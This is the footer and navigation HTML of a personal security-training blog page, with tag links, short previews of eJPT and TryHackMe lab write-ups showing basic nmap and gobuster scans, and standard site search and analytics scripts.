class="post-tag" href="/tags/ejpt/">ejpt</a> <a class="post-tag" href="/tags/ine/">ine</a> <a class="post-tag" href="/tags/knowledge/">knowledge</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/redteam/">redteam</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/INE-Blackbox-1/"><div class="card-body"> <span class="timeago small" >Jan 11<i class="unloaded">2022-01-11T14:30:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[eJPT] INE Blackbox 1</h3><div class="text-muted small"><p> INE Blackbox 1 Enumeration 1 Target: demo.ine.local (call this demo1) Our machine’s eth1: 192.141.206.2 ping demo.ine.local —&gt; 192.141.206.3 Our target is...</p></div></div></a></div><div class="card"> <a href="/posts/INE-Blackbox-3/"><div class="card-body"> <span class="timeago small" >Jan 12<i class="unloaded">2022-01-12T17:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[eJPT] INE Blackbox 3</h3><div class="text-muted small"><p> INE Blackbox 3 Our machine: 192.246.198.2 Enumeration 1: Target: server1.ine.local = 192.246.198.3 Nmap: nmap -sT -P0 192.246.198.3 —&gt; Port 80 opens. Go to the...</p></div></div></a></div><div class="card"> <a href="/posts/TryHackMe-Wonderland/"><div class="card-body"> <span class="timeago small" >Nov 21, 2021<i class="unloaded">2021-11-21T17:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[TryHackMe] Wonderland</h3><div class="text-muted small"><p> IP: 10.10.143.221 Enumeration Gobuster Nothing special… ┌──(kali㉿kali)-[~/Desktop/thm/wonderland] └─$ gobuster dir --url 10.10.143.221 -w /opt/seclists/Discovery/Web-Content/common.txt ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/INE-Blackbox-1/" class="btn btn-outline-primary" prompt="Older"><p>[eJPT] INE Blackbox 1</p></a> <a href="/posts/INE-Blackbox-3/" class="btn btn-outline-primary" prompt="Newer"><p>[eJPT] INE Blackbox 3</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/letri6tdn">Tri Nguyen (Nguyễn Lê Trí)</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/write-up/">write up</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/ejpt/">ejpt</a> <a class="post-tag" href="/tags/ine/">ine</a> <a class="post-tag" href="/tags/knowledge/">knowledge</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/redteam/">redteam</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
